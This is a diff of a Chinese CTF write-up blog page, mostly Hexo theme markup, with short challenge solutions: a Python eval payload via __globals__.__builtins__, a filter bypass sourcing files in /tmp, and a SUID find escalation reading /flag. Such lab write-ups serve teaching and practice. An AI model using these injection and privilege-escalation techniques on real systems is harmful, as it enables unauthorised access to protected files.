+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">app.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.eval(&quot;setattr(<span class="hljs-strong">__import__</span>(&#x27;sys&#x27;).modules[&#x27;<span class="hljs-strong">__main__</span>&#x27;],&#x27;<span class="hljs-strong">__file__</span>&#x27;,&#x27;/flag&#x27;)&quot;)<br></code></pre></td></tr></table></figure>
 
 <h1 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h1><p><a target="_blank" rel="noopener" href="http://8.137.112.104/?p=15">http://8.137.112.104/?p=15</a></p>
 <h1 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h1><p>扫后台发现&#x2F;admin.html，这里可以文件上传，并执行命令。</p>
-<p><img src="/img/dfjk/QQ_1724744695876.png" alt="QQ_1724744695876"></p>
+<p><img src="/img/dfjk/QQ_1724744695876.png" srcset="/img/loading.gif" lazyload alt="QQ_1724744695876"></p>
 <p>但是命令执行过滤了基本所有字符，留下的只有：</p>
 <p>命令部分fuzz出来的可用字符为t * . &#x2F;</p>
 <p>只能执行临时文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. /t*/*</span><br></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">. </span>/t*/*<br></code></pre></td></tr></table></figure>
 
 <p><strong>通过.(点，也就是 source命令)去执行&#x2F;tmp目录里的文件</strong></p>
-<p><img src="/img/dfjk/67a60b82f0a64abdb24b4041531f392b.png" alt="67a60b82f0a64abdb24b4041531f392b"></p>
+<p><img src="/img/dfjk/67a60b82f0a64abdb24b4041531f392b.png" srcset="/img/loading.gif" lazyload alt="67a60b82f0a64abdb24b4041531f392b"></p>
 <p>flag没有权限读，尝试提权，发现find命令有suid权限：</p>
-<p><img src="/img/dfjk/42dc5d58fe364771a2e7bb088d7266e4.png" alt="42dc5d58fe364771a2e7bb088d7266e4"></p>
+<p><img src="/img/dfjk/42dc5d58fe364771a2e7bb088d7266e4.png" srcset="/img/loading.gif" lazyload alt="42dc5d58fe364771a2e7bb088d7266e4"></p>
 <p>直接find执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec cat /flag \;</span><br></pre></td></tr></table></figure>
-
-	
-		</div>
-		
-		<div id="current-post-cover" data-scr="/img/dfjk/dfjk.png"></div>
-
-		<!-- relate post, comment...-->
-		<div class="investment-container">
-			<div class="investment-header">
-				<div class="investment-title-1">
-					<div class="on">相关文章</div>
-					<div>评论</div>
-					<div>分享</div>
-				</div>
-				<div class="investment-title-2">	            
-					
-	<span>
-		<a id="totop-post-page">返回顶部</a>
-		
-			<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web" rel="prev">
-				&laquo;上一篇
-			</a>
-		
-		
-			<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp" rel="next">
-				下一篇&raquo;
-			</a>
-			
-	</span>
-
-
-      		
-				</div>	
-			</div>
-			
-			<div class="investment-content">
-				<div class="investment-content-list">
-					
-
-<div class="relate-post">
-	
-		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">
-								第八届西湖论剑初赛web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 18日, 2025				
-							</p>
-							<p class="relate-post-content">
-								Rank-l
-可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302
-过滤了空格，用request.args.aaa可以参数逃逸。
-1phone_number=&#123;&#123;url_for.__global...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/xhlj8/XHLJ8.png" alt="第八届西湖论剑初赛web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
-								SUCTF 2025 WEB部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 14日, 2025				
-							</p>
-							<p class="relate-post-content">
-								SU_photogallery
-尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">
-								2024鹏城杯web全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 9日, 2024				
-							</p>
-							<p class="relate-post-content">
-								python口算-pcb2024123456789101112131415161718192021222324import requestsimport reurl = &quot;http://192.168.18.28&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/5.jpg" alt="2024鹏城杯web全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">
-								强网杯2024			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 3日, 2024				
-							</p>
-							<p class="relate-post-content">
-								PyBlockly黑名单过滤了所有符号，只能在print里用字母和数字，
-1234if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/qwb2024/qwb2024.png" alt="强网杯2024"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
-								SCTF2024 ezRender			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 7日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezRender这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。
-jwt密钥生成逻辑：
-123456789101112131415161718192021import timec...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SCTF2024/SCTF2024.jpg" alt="SCTF2024 ezRender"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">
-								ByteCTF2024大师赛web部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 21日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezobj源码：
-12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);include_once(&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024bytectf/bytectf.png" alt="ByteCTF2024大师赛web部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
-								第四届长城杯web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 8日, 2024				
-							</p>
-							<p class="relate-post-content">
-								WEB
-SQLUS
-
-
-
-猜测账户是admin密码是任意一个字符
-登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。
-
-
-
-在头像前端看到了上传路径
-
-
-flag没有权...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第四届长城杯/ccb.png" alt="第四届长城杯web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
-								NepCTF2024部分web			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
-12if os.path.islink(new_file):    return &...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
-								2024春秋杯部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								七月 6日, 2024				
-							</p>
-							<p class="relate-post-content">
-								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架
-
-一眼ssti模版注入，
-1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
-								PolarCTF2024夏季个人挑战赛全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 10日, 2024				
-							</p>
-							<p class="relate-post-content">
-								扫扫看不用扫，猜测是flag.php
-
-
-flag{094c9cc14068a7d18ccd0dd3606e532f}
-
-debudaoflag在cookie里：
-
-
-flag{72077a55w312584wb1aaa88888cd...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-		</ul>
-	
-</div>	
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-comment">
-
-	
-
-		
-
-			<!-- gitalk comment -->
-			<!-- show gitalk comment -->
-<div id="gitalk-container"></div>
-
-<!-- gitalk`s css & js -->
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<link rel="stylesheet" href="/css/comment.css">
-<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-	(function gitalkComment(){
-		//Thanks O-R
-		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
-		//去除尾部匹配正则数组的字符串  
-		//Remove redundant characters
-		String.prototype.trimEnd = function(regStr) {
-			let result = this;
-			if(regStr == undefined || regStr == null || regStr == "") {
-				return result;
-			}
-			let array = regStr.split(',');
-
-			if(array.length > 0) {
-
-				let c = array.shift(), 
-					str = this,
-					i = str.length,
-					rg = new RegExp(c),
-					matchArr = str.match(rg);
-
-				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
-					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
-						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
-						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
-						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
-						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
-						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
-						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
-						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
-					matchStr = matchStr + '$';
-					result = str.replace(new RegExp(matchStr), "");
-				}
-
-				if(array.length > 0) {
-					return result.trimEnd(array.join())
-				} else {
-					return result;
-				}
-			}
-		};
-
-		//Create gitalk
-		let gitalk = new Gitalk({
-			clientID: '333--',
-			clientSecret: '333--',
-			//id: window.location.pathname,
-			//id: decodeURI(window.location.pathname),
-			//id: (window.location.pathname).split("/").pop().substring(0, 49),
-			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
-			repo: 'annie-gitalk',
-			owner: 'Sariay',
-			admin: 'Sariay',
-			distractionFreeMode: 'true',
-		})
-		gitalk.render('gitalk-container');		
-	})();
-</script>
-
-		
-		
-	
-
-</div>
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-share">
-	
-	
-
-		
-			
-			<!-- socialShare share -->
-			<div class="social-share"></div>
-
-<!--  css & js -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
-<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-			
-		
-		
-	
-</div>
-
-
-				</div>
-			</div>	
-		</div>
-	</div>
-</div>
-
-<!-- show math formula -->
-
-
-
-	 
-	
-<script src="/plugin/clipboard/clipboard.js"></script>
-
-	<script>
-		// Copy code !
-	    function preprocessing() {
-	        $("#article-content .highlight").each(function() {
-	            $(this).wrap('<div id="post-code"></div>');
-	        })
-
-	        $("#article-content #post-code").each(function() {
-	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
-	        })
-
-	        $("#article-content .copy-nav").each(function() {
-	            let languageClass = $(this).next().attr('class'),
-	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
-
-	            $(this).find('.code-language').text(language);
-	            $(this).append('<span class="copy-btn icon-paste"></span>');
-	        });
-	    }
-
-		function copy() {
-		    $('#article-content #post-code').each(function(i) {
-		        let codeCopyId = 'codeCopy-' + i;
-
-		        let codeNode = $(this).find('.code'),
-		            copyButton = $(this).find('.copy-btn');
-
-		        codeNode.attr('id', codeCopyId);
-		        copyButton.attr('data-clipboard-target-id', codeCopyId);
-		    })
-   
-			let clipboard = new ClipboardJS('.copy-btn', {
-					target: function(trigger) {
-						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
-					}
-		      	});
-
-			//pure js
-			function showTooltip(elem, msg) {		   
-				elem.setAttribute('aria-label', msg);
-				elem.setAttribute('class', 'copy-btn icon-clipboard1');
-				setTimeout(function() {
-					elem.setAttribute('class', 'copy-btn icon-paste');
-				}, 2000);
-			}
-
-			clipboard.on('success', function(e) {
-			    e.clearSelection();
-			    console.info('Action:', e.action);		   
-			    console.info('Trigger:', e.trigger);
-			    showTooltip(e.trigger, 'Copied!');   
-			});
-			
-			clipboard.on('error', function(e) {
-			    console.error('Action:', e.action);
-			    console.error('Trigger:', e.trigger);
-			});
-		}
-		
-		(function copyCode(){
-			if ($('.layout-post').length) {
-			    preprocessing();
-			    copy();
-			} 
-		})();
-	</script>
-
-
-
-
-
-
-<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
-
-
-<script src="/plugin/fancybox/jquery.fancybox.js"></script>
-
-
-<script type="text/javascript">
-	(function gallerySet(){
-		let titleID = $('.article-title a'),
-			imageID = $('.article-content img'),
-			videoID = $('.article-content video');
-		
-		let postTitle = titleID.text() ? titleID.text() : "No post title!";
-		
-		imageID.each(function() {
-			let imgPath = $(this).attr('src'),
-				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
-		});
-		
-		videoID.each(function() {
-			let videoPath = $(this).attr('src');
-		
-			//给每个匹配的<img>元素打包, 即添加父元素<a>
-			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
-		});
-		
-		//TODO：支持html5 video
-
-		if($('#layout-post').length) {
-			$('[data-fancybox="gallery"]').fancybox({
-				loop: true,
-				buttons: [
-					"zoom",
-					"share",
-					"slideShow",
-					"fullScreen",
-					//"download",
-					"thumbs",
-					"close"
-				],
-				protect: true
-			});
-		}
-	})();
-</script>
-		</main>
-
-		<!--footer-->
-		<footer>
-	<div id="navigation-show">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-
-	<div class="copyright">
-		<p>
-			 
-				&copy;2024 - 2025, content by Infernity. All Rights Reserved.
-			
-			
-				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
-			
-		</p>
-		<p>
-			
-
-	<!-- busuanzi -->
-	<!-- busuanzi -->
-
-		
-	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-
-		<span id="busuanzi_container_page_pv">
-	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
-		</span>
-
-	
-
-
-
-
-			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
-			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
-		</p>
-	</div>		
-</footer>
-		
-	<!-- Local or hitokoto! -->
-
-	
-<script src="/plugin/motto/motto.js"></script>
-
-	
-	<script type="text/javascript">
-		(function motto(){
-			let mottoText = getMingYanContent().split('</br> - </br>'),
-			
-			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
-			
-			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
-			
-			mottoTextContent = mottoTextContent.trim().substring(0, 100);
-		
-			$("#motto-content").html( mottoTextContent);
-			$("#motto-author").html( mottoTextFrom  );
-		})();	
-	</script>	
-
-
-
-<!-- love effect -->
-
-	
-<script src="/plugin/love/love.js"></script>
-
-
-
-<!-- back to top -->
-
-	<div id="totop">
-	<span class="icon-circle-up"></span>
-</div>
-
-
-
-<!-- site analysis -->
-
-
-	<!-- site-analysis -->
-	
-	
-	
-	
-	
- 
-
-<!-- leancloud -->
-
-
-	<!-- leancloud -->
-	<!--
-	时间：2018-11-27
-	描述：
-		文章访问量：visitors
-		文章喜欢量：likes	
-		文章排行榜：topNPost
-		其他得说明：
-			01-Cookie相关的函数 
-				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
-			02-visitors相关的函数 
-				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
-				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
-			03-topNPost相关的函数
-				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
-			04-likes相关的函数，
-				参考了01 & 02进行简单的设计与实现
--->
-
-
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /etc/passwd -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
   
-<script src="/plugin/leancloud/av-min.js"></script>
-<script src="/js/leancloud-count.js"></script>
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
+      
+    </div>
+  
+</div>
 
 
-	
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024第七届巅峰极客部分wp</div>
+      <div>http://example.com/2024/08/25/2024第七届巅峰极客部分wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NepCTF2024部分web</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
+                        <span class="hidden-mobile">2024春秋杯部分wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
 
   
 
 
 
-<script src="/plugin/chinese/chinese.js"></script>
-<script src="/plugin/imagelazyloader/yall.min.js"></script>
-<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
-<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
-<script src="/plugin/resizediv/resizediv.js"></script>
-<script src="/js/main.js"></script>
+  
 
-	</body>	
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
